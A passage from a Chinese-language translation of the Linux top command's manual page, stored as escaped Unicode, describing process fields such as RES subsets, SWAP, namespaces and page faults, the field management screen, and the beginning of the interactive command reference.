\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff08VIRT\uff09\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u8868\u793a\u4efb\u52a1\u5f53\u524d\u4f7f\u7528\u7684\u672a\u4ea4\u6362\u7269\u7406\u5185\u5b58\u3002\u5b83\u4e5f\u662f RSan\u3001RSfd \u548c RSsh \u5b57\u6bb5\u7684\u603b\u548c\u3002 \u5b83\u53ef\u4ee5\u5305\u542b\u79c1\u6709\u533f\u540d\u9875\u9762\u3001\u6620\u5c04\u5230\u6587\u4ef6\u7684\u79c1\u6709\u9875\u9762\uff08\u5305\u62ec\u7a0b\u5e8f\u6620\u50cf\u548c\u5171\u4eab\u5e93\uff09\u4ee5\u53ca\u5171\u4eab\u533f\u540d\u9875\u9762\u3002\u6240\u6709\u8fd9\u4e9b\u5185\u5b58\u90fd\u7531 SWAP \u5355\u72ec\u8868\u793a\u7684\u4ea4\u6362\u6587\u4ef6\u652f\u6301\u3002 \u6700\u540e\uff0c\u6b64\u5b57\u6bb5\u8fd8\u53ef\u80fd\u5305\u542b\u4fee\u6539\u8fc7\u7684\u5171\u4eab\u6587\u4ef6\u652f\u6301\u9875\u9762\uff0c\u8fd9\u4e9b\u9875\u9762\u5145\u5f53\u4e13\u7528\u4ea4\u6362\u6587\u4ef6\uff0c\u56e0\u6b64\u6c38\u8fdc\u4e0d\u4f1a\u5f71\u54cd SWAP\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 23. RSan -- \u9a7b\u7559\u533f\u540d\u5185\u5b58\u5927\u5c0f\uff08KiB\uff09 \u9a7b\u7559\u5185\u5b58\uff08RES\uff09\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u8868\u793a\u672a\u6620\u5c04\u5230\u6587\u4ef6\u7684\u79c1\u6709\u9875\u9762\u3002 24. RSfd -- \u9a7b\u7559\u6587\u4ef6\u652f\u6301\u5185\u5b58\u5927\u5c0f\uff08KiB\uff09 \u9a7b\u7559\u5185\u5b58\uff08RES\uff09\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u8868\u793a\u9690\u5f0f\u5171\u4eab\u7684\u7a0b\u5e8f\u6620\u50cf\u548c\u5171\u4eab\u5e93\u9875\u9762\u3002\u5b83\u8fd8\u5305\u62ec\u663e\u5f0f\u6587\u4ef6\u6620\u5c04\uff0c\u65e0\u8bba\u662f\u79c1\u6709\u8fd8\u662f\u5171\u4eab\u3002 25. RSlk -- \u9a7b\u7559\u9501\u5b9a\u5185\u5b58\u5927\u5c0f\uff08KiB\uff09 \u9a7b\u7559\u5185\u5b58\uff08RES\uff09\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u4e0d\u80fd\u88ab\u4ea4\u6362\u51fa\u53bb\u3002 26. RSsh -- \u9a7b\u7559\u5171\u4eab\u5185\u5b58\u5927\u5c0f\uff08KiB\uff09 \u9a7b\u7559\u5185\u5b58\uff08RES\uff09\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u8868\u793a\u663e\u5f0f\u5171\u4eab\u7684\u533f\u540d shm*/mmap \u9875\u9762\u3002 27. RUID -- \u5b9e\u9645\u7528\u6237 ID \u5b9e\u9645\u7528\u6237 ID\u3002 28. RUSER -- \u5b9e\u9645\u7528\u6237\u540d \u5b9e\u9645\u7528\u6237\u540d\u3002 29. S -- \u8fdb\u7a0b\u72b6\u6001 \u4efb\u52a1\u7684\u72b6\u6001\uff0c\u53ef\u4ee5\u662f\u4ee5\u4e0b\u4e4b\u4e00\uff1a D = \u4e0d\u53ef\u4e2d\u65ad\u7684\u7761\u7720 I = \u7a7a\u95f2 R = \u8fd0\u884c S = \u7761\u7720 T = \u88ab\u4f5c\u4e1a\u63a7\u5236\u4fe1\u53f7\u505c\u6b62 t = \u5728\u8ddf\u8e2a\u671f\u95f4\u88ab\u8c03\u8bd5\u5668\u505c\u6b62 Z = \u50f5\u5c38 \u663e\u793a\u4e3a\u8fd0\u884c\u7684\u4efb\u52a1\u5e94\u66f4\u6070\u5f53\u5730\u89c6\u4e3a\u51c6\u5907\u8fd0\u884c -- \u5b83\u4eec\u7684 task_struct \u4ec5\u5728 Linux \u8fd0\u884c\u961f\u5217\u4e2d\u8868\u793a\u3002\u5373\u4f7f\u6ca1\u6709\u771f\u6b63\u7684 SMP \u673a\u5668\uff0c \u4f60\u53ef\u80fd\u4f1a\u770b\u5230\u8bb8\u591a\u4efb\u52a1\u5904\u4e8e\u6b64\u72b6\u6001\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e top \u7684\u5ef6\u8fdf\u95f4\u9694\u548c\u4f18\u5148\u503c\u3002 30. SHR -- \u5171\u4eab\u5185\u5b58\u5927\u5c0f\uff08KiB\uff09 \u9a7b\u7559\u5185\u5b58\uff08RES\uff09\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u53ef\u80fd\u88ab\u5176\u4ed6\u8fdb\u7a0b\u4f7f\u7528\u3002\u5b83\u5c06\u5305\u62ec\u5171\u4eab\u533f\u540d\u9875\u9762\u548c\u5171\u4eab\u6587\u4ef6\u652f\u6301\u9875\u9762\u3002\u5b83\u8fd8\u5305\u62ec\u8868\u793a\u7a0b\u5e8f\u6620\u50cf\u548c\u5171\u4eab\u5e93\u7684\u79c1\u6709\u9875\u9762\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 31. SID -- \u4f1a\u8bdd ID \u4f1a\u8bdd\u662f\u8fdb\u7a0b\u7ec4\uff08\u89c1 PGRP\uff09\u7684\u96c6\u5408\uff0c\u901a\u5e38\u7531\u767b\u5f55 shell \u5efa\u7acb\u3002\u65b0\u5206\u53c9\u7684\u8fdb\u7a0b\u52a0\u5165\u521b\u5efa\u8005\u7684\u4f1a\u8bdd\u3002\u6309\u7167\u60ef\u4f8b\uff0c \u6b64\u503c\u7b49\u4e8e\u4f1a\u8bdd\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\u7684\u8fdb\u7a0b ID\uff08\u89c1 PID\uff09\uff0c\u79f0\u4e3a\u4f1a\u8bdd\u9886\u5bfc\uff0c\u901a\u5e38\u662f\u767b\u5f55 shell\u3002 32. SUID -- \u4fdd\u5b58\u7684\u7528\u6237 ID \u4fdd\u5b58\u7684\u7528\u6237 ID\u3002 33. SUPGIDS -- \u8865\u5145\u7ec4 ID \u5728\u767b\u5f55\u65f6\u6216\u4ece\u4efb\u52a1\u7684\u7236\u8fdb\u7a0b\u7ee7\u627f\u7684\u4efb\u4f55\u8865\u5145\u7ec4 ID\u3002\u5b83\u4eec\u4ee5\u9017\u53f7\u5206\u9694\u7684\u5217\u8868\u663e\u793a\u3002 \u6ce8\u610f\uff1aSUPGIDS \u5b57\u6bb5\u4e0e\u5927\u591a\u6570\u5217\u4e0d\u540c\uff0c\u4e0d\u662f\u56fa\u5b9a\u5bbd\u5ea6\u7684\u3002\u5f53\u663e\u793a\u65f6\uff0c\u5b83\u52a0\u4e0a\u4efb\u4f55\u5176\u4ed6\u53ef\u53d8\u5bbd\u5ea6\u5217\u5c06\u5206\u914d\u6240\u6709\u5269\u4f59\u7684\u5c4f\u5e55\u5bbd\u5ea6\uff08\u6700\u591a 512 \u5b57\u7b26\uff09\u3002 \u5373\u4fbf\u5982\u6b64\uff0c\u8fd9\u4e9b\u53ef\u53d8\u5bbd\u5ea6\u5b57\u6bb5\u4ecd\u7136\u53ef\u80fd\u4f1a\u88ab\u622a\u65ad\u3002\u6709\u5173\u8bbf\u95ee\u4efb\u4f55\u88ab\u622a\u65ad\u6570\u636e\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 5c. \u7a97\u53e3\u6eda\u52a8\u3002 34. SUPGRPS -- SUPGRPS -- \u8865\u5145\u7ec4\u540d \u5728\u767b\u5f55\u65f6\u6216\u4ece\u4efb\u52a1\u7684\u7236\u8fdb\u7a0b\u7ee7\u627f\u7684\u4efb\u4f55\u8865\u5145\u7ec4\u540d\u3002\u5b83\u4eec\u4ee5\u9017\u53f7\u5206\u9694\u7684\u5217\u8868\u663e\u793a\u3002 \u6ce8\u610f\uff1aSUPGRPS \u5b57\u6bb5\u4e0e\u5927\u591a\u6570\u5217\u4e0d\u540c\uff0c\u4e0d\u662f\u56fa\u5b9a\u5bbd\u5ea6\u7684\u3002\u5f53\u663e\u793a\u65f6\uff0c\u5b83\u52a0\u4e0a\u4efb\u4f55\u5176\u4ed6\u53ef\u53d8\u5bbd\u5ea6\u5217\u5c06\u5206\u914d\u6240\u6709\u5269\u4f59\u7684\u5c4f\u5e55\u5bbd\u5ea6\uff08\u6700\u591a 512 \u5b57\u7b26\uff09\u3002 \u5373\u4fbf\u5982\u6b64\uff0c\u8fd9\u4e9b\u53ef\u53d8\u5bbd\u5ea6\u5b57\u6bb5\u4ecd\u7136\u53ef\u80fd\u4f1a\u88ab\u622a\u65ad\u3002\u6709\u5173\u8bbf\u95ee\u4efb\u4f55\u88ab\u622a\u65ad\u6570\u636e\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 5c. \u7a97\u53e3\u6eda\u52a8\u3002 35. SUSER -- \u4fdd\u5b58\u7684\u7528\u6237\u540d \u4fdd\u5b58\u7684\u7528\u6237\u540d\u3002 36. SWAP -- \u4ea4\u6362\u5927\u5c0f\uff08KiB\uff09 \u5f53\u7269\u7406\u5185\u5b58\u8fc7\u5ea6\u627f\u8bfa\u65f6\u5199\u5165\u4ea4\u6362\u6587\u4ef6\u7684\u4efb\u52a1\u5730\u5740\u7a7a\u95f4\u4e2d\u4ee5\u524d\u9a7b\u7559\u7684\u90e8\u5206\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 37. TGID -- \u7ebf\u7a0b\u7ec4 ID \u4efb\u52a1\u6240\u5c5e\u7684\u7ebf\u7a0b\u7ec4\u7684 ID\u3002\u5b83\u662f\u7ebf\u7a0b\u7ec4\u9886\u5bfc\u7684 PID\u3002\u5728\u5185\u6838\u672f\u8bed\u4e2d\uff0c\u5b83\u8868\u793a\u90a3\u4e9b\u5171\u4eab mm_struct \u7684\u4efb\u52a1\u3002 38. TIME -- CPU \u65f6\u95f4 \u4efb\u52a1\u81ea\u542f\u52a8\u4ee5\u6765\u4f7f\u7528\u7684\u603b CPU \u65f6\u95f4\u3002\u5f53\u7d2f\u79ef\u6a21\u5f0f\u5f00\u542f\u65f6\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u5c06\u5217\u51fa\u5176\u81ea\u8eab\u53ca\u5176\u5df2\u7ec8\u6b62\u7684\u5b50\u8fdb\u7a0b\u4f7f\u7528\u7684 CPU \u65f6\u95f4\u3002 \u4f60\u53ef\u4ee5\u4f7f\u7528 `S` \u5207\u6362\u7d2f\u79ef\u6a21\u5f0f\uff0c`S` \u65e2\u662f\u547d\u4ee4\u884c\u9009\u9879\u4e5f\u662f\u4ea4\u4e92\u547d\u4ee4\u3002\u6709\u5173\u6b64\u6a21\u5f0f\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `S` \u4ea4\u4e92\u547d\u4ee4\u3002 39. TIME+ -- CPU \u65f6\u95f4\uff0c\u4ee5\u767e\u5206\u4e4b\u4e00\u79d2\u4e3a\u5355\u4f4d \u4e0e TIME \u76f8\u540c\uff0c\u4f46\u53cd\u6620\u66f4\u591a\u7c92\u5ea6\uff0c\u901a\u8fc7\u767e\u5206\u4e4b\u4e00\u79d2\u3002 40. TPGID -- TTY \u8fdb\u7a0b\u7ec4 ID \u8fde\u63a5\u7684 TTY \u7684\u524d\u53f0\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u7ec4 ID\uff0c\u5982\u679c\u8fdb\u7a0b\u672a\u8fde\u63a5\u5230\u7ec8\u7aef\uff0c\u5219\u4e3a -1\u3002\u6309\u7167\u60ef\u4f8b\uff0c\u6b64\u503c\u7b49\u4e8e\u8fdb\u7a0b\u7ec4\u9886\u5bfc\u7684\u8fdb\u7a0b ID\uff08\u89c1 PGRP\uff09\u3002 41. TTY -- \u63a7\u5236\u7ec8\u7aef \u63a7\u5236\u7ec8\u7aef\u7684\u540d\u79f0\u3002\u8fd9\u901a\u5e38\u662f\u4efb\u52a1\u542f\u52a8\u65f6\u4f7f\u7528\u7684\u8bbe\u5907\uff08\u4e32\u884c\u7aef\u53e3\u3001\u865a\u62df\u7ec8\u7aef\u7b49\uff09\uff0c\u5e76\u7528\u4e8e\u8f93\u5165\u6216\u8f93\u51fa\u3002\u7136\u800c\uff0c\u4efb\u52a1\u4e0d\u5fc5\u4e0e\u7ec8\u7aef\u5173\u8054\uff0c \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4f60\u4f1a\u770b\u5230\u663e\u793a `?`\u3002 42. UID -- \u7528\u6237 ID \u4efb\u52a1\u6240\u6709\u8005\u7684\u6709\u6548\u7528\u6237 ID\u3002 43. USED -- \u4f7f\u7528\u4e2d\u7684\u5185\u5b58\uff08KiB\uff09 \u6b64\u5b57\u6bb5\u8868\u793a\u4efb\u52a1\u4f7f\u7528\u7684\u672a\u4ea4\u6362\u7269\u7406\u5185\u5b58\uff08RES\uff09\u52a0\u4e0a\u5176\u5730\u5740\u7a7a\u95f4\u4e2d\u4ea4\u6362\u51fa\u7684\u90e8\u5206\uff08SWAP\uff09\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 44. USER -- \u7528\u6237\u540d \u4efb\u52a1\u6240\u6709\u8005\u7684\u6709\u6548\u7528\u6237\u540d\u3002 45. VIRT -- \u865a\u62df\u5185\u5b58\u5927\u5c0f\uff08KiB\uff09 \u4efb\u52a1\u4f7f\u7528\u7684\u865a\u62df\u5185\u5b58\u603b\u91cf\u3002\u5b83\u5305\u62ec\u6240\u6709\u4ee3\u7801\u3001\u6570\u636e\u548c\u5171\u4eab\u5e93\uff0c\u52a0\u4e0a\u5df2\u4ea4\u6362\u51fa\u7684\u9875\u9762\u548c\u5df2\u6620\u5c04\u4f46\u672a\u4f7f\u7528\u7684\u9875\u9762\u3002 \u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `\u6982\u8ff0\uff0cLinux \u5185\u5b58\u7c7b\u578b`\u3002 46. WCHAN -- \u4f11\u7720\u4e2d\u7684\u51fd\u6570 \u6b64\u5b57\u6bb5\u5c06\u663e\u793a\u4efb\u52a1\u5f53\u524d\u4f11\u7720\u7684\u5185\u6838\u51fd\u6570\u7684\u540d\u79f0\u3002\u8fd0\u884c\u4e2d\u7684\u4efb\u52a1\u5c06\u5728\u6b64\u5217\u4e2d\u663e\u793a\u7834\u6298\u53f7 (`-`)\u3002 47. nDRT -- \u810f\u9875\u6570 \u81ea\u4e0a\u6b21\u5199\u5165\u8f85\u52a9\u5b58\u50a8\u4ee5\u6765\u5df2\u4fee\u6539\u7684\u9875\u9762\u6570\u3002\u810f\u9875\u5fc5\u987b\u5199\u5165\u8f85\u52a9\u5b58\u50a8\uff0c\u7136\u540e\u76f8\u5e94\u7684\u7269\u7406\u5185\u5b58\u4f4d\u7f6e\u624d\u80fd\u7528\u4e8e\u5176\u4ed6\u865a\u62df\u9875\u9762\u3002 \u6b64\u5b57\u6bb5\u5728 linux 2.6 \u7248\u672c\u4e2d\u88ab\u5f03\u7528\uff0c\u603b\u662f\u4e3a\u96f6\u3002 48. nMaj -- \u4e3b\u9875\u9762\u9519\u8bef\u6570 \u4efb\u52a1\u53d1\u751f\u7684\u4e3b\u9875\u9762\u9519\u8bef\u6570\u3002\u5f53\u8fdb\u7a0b\u5c1d\u8bd5\u4ece\u5176\u5730\u5740\u7a7a\u95f4\u5f53\u524d\u4e0d\u5b58\u5728\u7684\u865a\u62df\u9875\u9762\u8bfb\u53d6\u6216\u5199\u5165\u65f6\uff0c\u4f1a\u53d1\u751f\u9875\u9762\u9519\u8bef\u3002 \u4e3b\u9875\u9762\u9519\u8bef\u662f\u6307\u6d89\u53ca\u8f85\u52a9\u5b58\u50a8\u8bbf\u95ee\u4ee5\u4f7f\u8be5\u9875\u9762\u53ef\u7528\u7684\u9519\u8bef\u3002 49. nMin -- \u6b21\u9875\u9762\u9519\u8bef\u6570 \u4efb\u52a1\u53d1\u751f\u7684\u6b21\u9875\u9762\u9519\u8bef\u6570\u3002\u5f53\u8fdb\u7a0b\u5c1d\u8bd5\u4ece\u5176\u5730\u5740\u7a7a\u95f4\u5f53\u524d\u4e0d\u5b58\u5728\u7684\u865a\u62df\u9875\u9762\u8bfb\u53d6\u6216\u5199\u5165\u65f6\uff0c\u4f1a\u53d1\u751f\u9875\u9762\u9519\u8bef\u3002 \u6b21\u9875\u9762\u9519\u8bef\u4e0d\u6d89\u53ca\u8f85\u52a9\u5b58\u50a8\u8bbf\u95ee\u4ee5\u4f7f\u8be5\u9875\u9762\u53ef\u7528\u3002 50. nTH -- \u7ebf\u7a0b\u6570 \u4e0e\u8fdb\u7a0b\u5173\u8054\u7684\u7ebf\u7a0b\u6570\u3002 51. nsIPC -- IPC \u547d\u540d\u7a7a\u95f4 \u7528\u4e8e\u9694\u79bb\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff08IPC\uff09\u8d44\u6e90\uff08\u5982 System V IPC \u5bf9\u8c61\u548c POSIX \u6d88\u606f\u961f\u5217\uff09\u7684\u547d\u540d\u7a7a\u95f4\u7684 Inode\u3002 52. nsMNT -- \u6302\u8f7d\u547d\u540d\u7a7a\u95f4 \u7528\u4e8e\u9694\u79bb\u6587\u4ef6\u7cfb\u7edf\u6302\u8f7d\u70b9\u7684\u547d\u540d\u7a7a\u95f4\u7684 Inode\uff0c\u4ece\u800c\u63d0\u4f9b\u6587\u4ef6\u7cfb\u7edf\u5c42\u6b21\u7ed3\u6784\u7684\u4e0d\u540c\u89c6\u56fe\u3002 53. nsNET -- \u7f51\u7edc\u547d\u540d\u7a7a\u95f4 \u7528\u4e8e\u9694\u79bb\u8d44\u6e90\uff08\u5982\u7f51\u7edc\u8bbe\u5907\u3001IP \u5730\u5740\u3001IP \u8def\u7531\u3001\u7aef\u53e3\u53f7\u7b49\uff09\u7684\u547d\u540d\u7a7a\u95f4\u7684 Inode\u3002 54. nsPID -- PID \u547d\u540d\u7a7a\u95f4 \u7528\u4e8e\u9694\u79bb\u8fdb\u7a0b ID \u53f7\u7684\u547d\u540d\u7a7a\u95f4\u7684 Inode\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u4eec\u4e0d\u5fc5\u4fdd\u6301\u552f\u4e00\u3002\u56e0\u6b64\uff0c\u6bcf\u4e2a\u8fd9\u6837\u7684\u547d\u540d\u7a7a\u95f4\u53ef\u4ee5\u6709\u81ea\u5df1\u7684 `init/systemd` \uff08PID #1\uff09\u6765\u7ba1\u7406\u5404\u79cd\u521d\u59cb\u5316\u4efb\u52a1\u548c\u6536\u517b\u5b64\u513f\u5b50\u8fdb\u7a0b\u3002 55. nsUSER -- \u7528\u6237\u547d\u540d\u7a7a\u95f4 \u7528\u4e8e\u9694\u79bb\u7528\u6237\u548c\u7ec4 ID \u53f7\u7684\u547d\u540d\u7a7a\u95f4\u7684 Inode\u3002\u56e0\u6b64\uff0c\u8fdb\u7a0b\u5728\u7528\u6237\u547d\u540d\u7a7a\u95f4\u4e4b\u5916\u53ef\u4ee5\u6709\u6b63\u5e38\u7684\u975e\u7279\u6743\u7528\u6237 ID\uff0c \u800c\u5728\u8be5\u547d\u540d\u7a7a\u95f4\u5185\u5177\u6709 0 \u7684\u7528\u6237 ID\uff0c\u5177\u6709\u5b8c\u5168\u7684 root \u6743\u9650\u3002 56. nsUTS -- UTS \u547d\u540d\u7a7a\u95f4 \u7528\u4e8e\u9694\u79bb\u4e3b\u673a\u540d\u548c NIS \u57df\u540d\u7684\u547d\u540d\u7a7a\u95f4\u7684 Inode\u3002UTS \u7b80\u5355\u5730\u8868\u793a\u201cUNIX \u5171\u4eab\u7cfb\u7edf\u201d\u3002 57. vMj -- \u4e3b\u9875\u9762\u9519\u8bef\u6570\u589e\u91cf \u81ea\u4e0a\u6b21\u66f4\u65b0\u4ee5\u6765\u53d1\u751f\u7684\u4e3b\u9875\u9762\u9519\u8bef\u6570\uff08\u89c1 nMaj\uff09\u3002 58. vMn -- \u6b21\u9875\u9762\u9519\u8bef\u6570\u589e\u91cf \u81ea\u4e0a\u6b21\u66f4\u65b0\u4ee5\u6765\u53d1\u751f\u7684\u6b21\u9875\u9762\u9519\u8bef\u6570\uff08\u89c1 nMin\uff09\u3002 3b. \u7ba1\u7406\u5b57\u6bb5 \u6309\u4e0b\u4ea4\u4e92\u547d\u4ee4 `f` \u6216 `F` \u540e\uff0c\u4f60\u5c06\u770b\u5230\u4e00\u4e2a\u5c4f\u5e55\uff0c\u663e\u793a\uff1a1\uff09\u201c\u5f53\u524d\u201d\u7a97\u53e3\u540d\u79f0\uff1b2\uff09\u6307\u5b9a\u7684\u6392\u5e8f\u5b57\u6bb5\uff1b3\uff09\u5f53\u524d\u987a\u5e8f\u663e\u793a\u7684\u6240\u6709\u5b57\u6bb5\u4ee5\u53ca\u63cf\u8ff0\u3002 \u6807\u6709\u661f\u53f7\u7684\u6761\u76ee\u662f\u5f53\u524d\u663e\u793a\u7684\u5b57\u6bb5\uff0c\u5c4f\u5e55\u5bbd\u5ea6\u5141\u8bb8\u3002 \u2022 \u5982\u5c4f\u5e55\u4e0a\u7684\u8bf4\u660e\u6240\u793a\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u4e0a\u4e0b\u7bad\u5934\u952e\u5728\u5b57\u6bb5\u4e4b\u95f4\u5bfc\u822a\u3002PgUp\u3001PgDn\u3001Home \u548c End \u952e\u4e5f\u53ef\u4ee5\u5feb\u901f\u5230\u8fbe\u7b2c\u4e00\u4e2a\u6216\u6700\u540e\u4e00\u4e2a\u53ef\u7528\u5b57\u6bb5\u3002 \u2022 \u53f3\u7bad\u5934\u952e\u9009\u62e9\u4e00\u4e2a\u5b57\u6bb5\u8fdb\u884c\u91cd\u65b0\u5b9a\u4f4d\uff0c\u5de6\u7bad\u5934\u952e\u6216 <Enter> \u952e\u786e\u8ba4\u8be5\u5b57\u6bb5\u7684\u4f4d\u7f6e\u3002 \u2022 `d` \u952e\u6216 <Space> \u952e\u5207\u6362\u5b57\u6bb5\u7684\u663e\u793a\u72b6\u6001\uff0c\u56e0\u6b64\u662f\u5426\u663e\u793a\u661f\u53f7\u3002 \u2022 `s` \u952e\u6307\u5b9a\u4e00\u4e2a\u5b57\u6bb5\u4e3a\u6392\u5e8f\u5b57\u6bb5\u3002\u6709\u5173\u9009\u62e9\u6392\u5e8f\u5b57\u6bb5\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 4c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4\uff0c\u6392\u5e8f\u3002 \u2022 `a` \u548c `w` \u952e\u53ef\u4ee5\u7528\u4e8e\u5faa\u73af\u6240\u6709\u53ef\u7528\u7a97\u53e3\uff0c`q` \u6216 <Esc> \u952e\u9000\u51fa\u5b57\u6bb5\u7ba1\u7406\u3002 \u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\u8fd8\u53ef\u4ee5\u7528\u4e8e\u5728\u5168\u5c4f\u6a21\u5f0f\u6216\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u66f4\u6539\u201c\u5f53\u524d\u201d\u7a97\u53e3/\u5b57\u6bb5\u7ec4\u3002\u8fd4\u56de top \u663e\u793a\u65f6\uff0c\u6309 `q` \u6216 <Esc> \u952e\u65f6\u76ee\u6807\u7a97\u53e3\u5c06\u88ab\u8bbe\u4e3a\u5f53\u524d\u7a97\u53e3\u3002 \u6709\u5173\u201c\u5f53\u524d\u201d\u7a97\u53e3\u548c\u5b57\u6bb5\u7ec4\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 5. \u66ff\u4ee3\u663e\u793a\u9009\u9879\u548c `g` \u4ea4\u4e92\u547d\u4ee4\u3002 \u6ce8\u610f\uff1a\u5982\u679c\u901a\u8fc7\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\u8fdb\u884c\u7684\u4efb\u4f55\u5b57\u6bb5\u66f4\u6539\uff0c\u4efb\u4f55\u5df2\u6c34\u5e73\u6eda\u52a8\u7684\u7a97\u53e3\u5c06\u88ab\u91cd\u7f6e\u3002\u7136\u800c\uff0c\u4efb\u4f55\u5782\u76f4\u6eda\u52a8\u7684\u4f4d\u7f6e\u5c06\u4e0d\u4f1a\u53d7\u5230\u5f71\u54cd\u3002 \u6709\u5173\u5782\u76f4\u548c\u6c34\u5e73\u6eda\u52a8\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 5c. \u7a97\u53e3\u6eda\u52a8\u3002 4. \u4ea4\u4e92\u547d\u4ee4 \u4ee5\u4e0b\u662f\u547d\u4ee4\u7684\u7b80\u8981\u7d22\u5f15\uff0c\u6309\u7c7b\u522b\u5206\u7c7b\u3002\u6709\u4e9b\u547d\u4ee4\u51fa\u73b0\u4e0d\u6b62\u4e00\u6b21\u2014\u2014\u5b83\u4eec\u7684\u542b\u4e49\u6216\u8303\u56f4\u53ef\u80fd\u4f1a\u6839\u636e\u53d1\u51fa\u547d\u4ee4\u7684\u4e0a\u4e0b\u6587\u800c\u6709\u6240\u4e0d\u540c\u3002 4a. \u5168\u5c40\u547d\u4ee4 <Ent/Sp> ?, =, 0, A, B, d, E, e, g, h, H, I, k, q, r, s, W, X, Y, Z 4b. \u6458\u8981\u533a\u57df\u547d\u4ee4 C, l, t, m, 1, 2, 3, 4, ! 4c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4 \u5916\u89c2: b, J, j, x, y, z \u5185\u5bb9: c, f, F, o, O, S, u, U, V, v \u5927\u5c0f: #, i, n \u6392\u5e8f: <, >, f, F, R 4d. \u989c\u8272\u6620\u5c04 <Ret>, a, B, b, H, M, q, S, T, w, z, 0 - 7 5b. \u7a97\u53e3\u547d\u4ee4 -, _, =, +, A, a, g, G, w 5c. \u7a97\u53e3\u6eda\u52a8 C, Up, Dn, Left, Right, PgUp, PgDn, Home, End 5d. \u7a97\u53e3\u641c\u7d22 L, & 4a. \u5168\u5c40\u547d\u4ee4 \u5168\u5c4f\u6a21\u5f0f\u548c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u59cb\u7ec8\u53ef\u7528\u5168\u5c40\u4ea4\u4e92\u547d\u4ee4\u3002\u7136\u800c\uff0c\u5728\u5b89\u5168\u6a21\u5f0f\u4e0b\uff0c\u67d0\u4e9b\u4ea4\u4e92\u547d\u4ee4\u4e0d\u53ef\u7528\u3002 \u5982\u679c\u4f60\u60f3\u63d0\u524d\u77e5\u9053\u4f60\u7684 top \u662f\u5426\u5df2\u88ab\u5b89\u5168\uff0c\u8bf7\u8bf7\u6c42\u5e2e\u52a9\u5e76\u67e5\u770b\u7b2c\u4e8c\u884c\u4e0a\u7684\u7cfb\u7edf\u6458\u8981\u3002 <Enter> \u6216 <Space> :\u5237\u65b0\u663e\u793a \u8fd9\u4e9b\u547d\u4ee4\u5524\u9192 top\uff0c\u5e76\u5728\u6536\u5230\u4efb\u4f55\u8f93\u5165\u540e\u91cd\u65b0\u7ed8\u5236\u6574\u4e2a\u663e\u793a\u3002\u5b83\u4eec\u8fd8\u5f3a\u5236\u66f4\u65b0\u4efb\u4f55\u70ed\u63d2\u62d4\u7684 CPU \u6216\u7269\u7406\u5185\u5b58\u53d8\u5316\u3002 \u5982\u679c\u4f60\u6709\u4e00\u4e2a\u8f83\u5927\u7684\u5ef6\u8fdf\u95f4\u9694\uff0c\u5e76\u5e0c\u671b\u67e5\u770b\u5f53\u524d\u72b6\u6001\uff0c\u8bf7\u4f7f\u7528\u5176\u4e2d\u4efb\u4f55\u4e00\u4e2a\u952e\uff0c ? | h :\u5e2e\u52a9 \u6709\u4e24\u4e2a\u5e2e\u52a9\u7ea7\u522b\u53ef\u7528\u3002\u7b2c\u4e00\u4e2a\u5c06\u63d0\u4f9b\u6240\u6709\u57fa\u672c\u4ea4\u4e92\u547d\u4ee4\u7684\u63d0\u9192\u3002\u5982\u679c top \u88ab\u4fdd\u62a4\uff0c\u8be5\u5c4f\u5e55\u5c06\u88ab\u7f29\u77ed\u3002 \u5728\u8be5\u5e2e\u52a9\u5c4f\u5e55\u4e0a\u952e\u5165 `h` \u6216 `?` \u5c06\u5e26\u4f60\u8fdb\u5165\u9002\u7528\u4e8e\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u7684\u4ea4\u4e92\u547d\u4ee4\u7684\u5e2e\u52a9\u3002 = :\u9000\u51fa\u663e\u793a\u9650\u5236 \u5220\u9664\u663e\u793a\u5185\u5bb9\u7684\u9650\u5236\u3002\u6b64\u547d\u4ee4\u5c06\u53cd\u8f6c\u4efb\u4f55 `i`\uff08\u7a7a\u95f2\u4efb\u52a1\uff09\u3001`n`\uff08\u6700\u5927\u4efb\u52a1\uff09\u548c 